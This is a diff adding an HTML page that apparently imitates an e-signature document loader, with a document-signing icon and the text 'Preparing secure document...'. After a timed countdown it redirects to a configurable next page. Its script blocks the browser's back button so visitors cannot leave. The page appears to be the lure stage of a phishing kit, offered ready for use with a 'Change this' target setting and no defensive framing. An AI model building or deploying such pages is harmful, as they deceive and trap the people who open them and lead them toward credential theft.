@@ -1,0 +1,67 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<title>e-sign</title>
+<link rel="shortcut icon" href="https://i.ibb.co/yF35Jv2Q/docu-ico.png" type="image/x-icon">
+<style>
+body {
+    background: url('https://i.ibb.co/0RScbvYK/Perfect.png') no-repeat center center fixed;
+    background-size: cover;
+    backdrop-filter: blur(5px);
+    height: 100vh;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+}
+.container { max-width: 500px; padding: 20px; text-align: center; }
+img { animation: fade 1.5s infinite alternate; }
+@keyframes fade { from { opacity: 1; } to { opacity: 0.4; } }
+.status { margin-top: 20px; font-size: 15px; color: #333; }
+#rl {
+    display: inline-block;
+    height: 18px; width: 18px;
+    border: 4px solid lightgray;
+    border-radius: 50%;
+    border-top-color: #0072ce;
+    animation: roll 1s infinite linear;
+    margin: 30px auto 0;
+}
+@keyframes roll { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+</style>
+</head>
+<body>
+<div class="container">
+    <img src="https://i.ibb.co/4nnyWHCk/4726010.png" width="65" height="65" alt="PDF Icon">
+    <p class="status" id="statusText">Preparing secure document...</p>
+    <span id="rl"></span>
+</div>
+
+<script>
+// Config
+const targetPage = "next.html";   // ← Change this
+const loadingTime = 4500;
+
+const statusText = document.getElementById('statusText');
+let countdown = Math.ceil(loadingTime / 1000);
+
+const countdownInterval = setInterval(() => {
+    if (countdown > 1) {
+        countdown--;
+        statusText.textContent = `Preparing secure document... (${countdown}s)`;
+    }
+}, 1000);
+
+setTimeout(() => {
+    statusText.textContent = "Opening document...";
+    window.location.replace(targetPage);
+}, loadingTime);
+
+// Back button block
+function blockBack() { history.pushState(null, null, location.href); }
+blockBack();
+window.addEventListener('popstate', blockBack);
+</script>
+</body>
+</html>
